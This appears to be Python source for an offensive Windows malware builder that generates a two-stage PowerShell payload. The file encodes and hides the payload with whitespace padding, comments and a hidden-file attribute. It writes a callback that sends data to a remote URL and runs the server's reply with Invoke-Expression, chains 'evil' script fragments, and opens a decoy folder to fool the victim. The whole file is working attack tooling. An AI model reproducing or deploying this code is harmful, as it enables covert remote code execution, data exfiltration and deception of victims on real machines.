from lib import powershell
import logging
import base64
import win32con, win32api
import os


# generate the payload that invokes the more advanced payload from a file
def first_stage_payload(exec_filename, bypass=False, full_path=True, custom_path=None, hide_window=True):
    logger = logging.getLogger("stage-1 payload")
    expression = powershell.func_invoke_script_base64(exec_filename)
    logger.debug("generated first stage payload: %s" % expression)
    encoded = powershell.ps_base64(expression)
    logger.debug("encoded first stage payload: %s" % encoded)
    cmd, args = powershell.encoded_args(encoded, bypass=bypass, hide_window=hide_window, custom_path=custom_path, full_path=full_path)
    return cmd, args


# prepare the full payload
# optional: base64 encode the payload
# optional: multi_line_comment to try hiding the actual payload after the file is opened by unwanted people
def second_stage_payload(file_path, file_content, encode=True, multi_line_comment=200, hidden_file=True, remove_old=True):
    logger = logging.getLogger("stage-2 payload")
    if remove_old and os.path.exists(file_path):
        os.remove(file_path)
        logger.debug("removed existing file %s" % file_path)
    if multi_line_comment and encode:
        obfusdata = " " * 300
        obfusdata += "<#"
        obfusdata += "\n" * multi_line_comment
        obfusdata += "#>\n"
        logger.debug("[Obfuscation] wrote %d bytes to start of payload" % len(obfusdata))
        file_content = obfusdata + file_content
    file_content = base64.b64encode(file_content.encode('ascii')).decode('utf-8')
    logger.debug("encoded file content -> base64")
    try:
        with open(file_path, 'w') as f:
            f.write(file_content)
        logger.info("wrote %d bytes to file %s" % (len(file_content), file_path))
        if hidden_file:
            win32api.SetFileAttributes(file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            logger.debug("set file attribute to hidden")
        return True
    except Exception as e:
        logger.error(str(e))
        return False


def callback_generator(callback_url, callback_id, callback_string, use_post=True, base64_encode=True):
    output = ""
    logger = logging.getLogger("callback generator")
    # we do not need to preserve the original output
    if base64_encode:
        enc, var = powershell.func_b64encode("$" + callback_string)
        output += enc
        output += powershell.func_urlencode(var, callback_string)
    else:
        output += powershell.func_urlencode(callback_string, callback_string)

    if not use_post:
        logger.warning("using GET requests limits the request url length to 2,083 characters, "
                       "exceeding this might result in callback failure")
        output += "$tmp='%s?%s='+$%s;" % (callback_url, callback_id, callback_string)
        http_req, http_res = powershell.func_http_get("$tmp")
        output += http_req
        output += "Invoke-Expression $%s.Content;" % http_res
        return output
    else:
        output += "$tmp='%s='+$%s;" % (callback_id, callback_string)
        http_req, http_res = powershell.func_http_post("'%s'" % callback_url, "$tmp")
        output += http_req
        output += "Invoke-Expression $%s.Content;" % http_res
        return output


def append_evil(directory):
    output = ""
    for file in os.listdir(directory):
        rpath = os.path.join(directory, file)
        if os.path.isfile(rpath) and not rpath.endswith('readme.txt'):
            with open(rpath, 'r') as f:
                raw = f.read()
                raw = raw.strip()
                if not raw.endswith(';'):
                    # for bad code.
                    raw += ";"
                output += raw
    return output


# open a fake (empty) folder
def fake_folder(folder_name, target_dir, create_fake_folder=True):
    dirname = os.path.join(target_dir, folder_name)
    if not os.path.exists(dirname) and create_fake_folder:
        os.mkdir(dirname)
    command = '$fopen=(Get-Item -Path ".\\").Name+"%s"; & explorer $fopen;' % folder_name
    return command




